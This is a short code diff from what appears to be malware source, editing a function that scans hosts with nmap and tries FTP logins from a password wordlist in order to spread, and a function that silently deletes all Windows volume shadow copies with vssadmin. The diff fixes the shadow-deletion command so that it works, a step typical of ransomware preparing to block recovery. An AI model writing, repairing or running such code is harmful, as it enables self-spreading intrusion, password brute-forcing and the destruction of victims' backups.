@@ -154,7 +154,7 @@ def ftp_spread():
     # Spread through ftp
     nm = nmap.PortScanner
     hosts = nm.all_hosts()
-    password = open('wordlist.txt', 'r+').read().split('\n')
+    password = open('nmap.lst', 'r+').read().split('\n')
     for host in hosts:
         try:
             subprocess.run(f'ftp -A {host}', shell=True)
@@ -175,7 +175,7 @@ def ftp_spread():
 
 def dlt_shadow_copy():
     try:
-        os.system('vssadmin.exe delete shadows/all /quiet')
+        os.system('vssadmin delete shadows /all /quiet')
     except Exception:
         pass
 
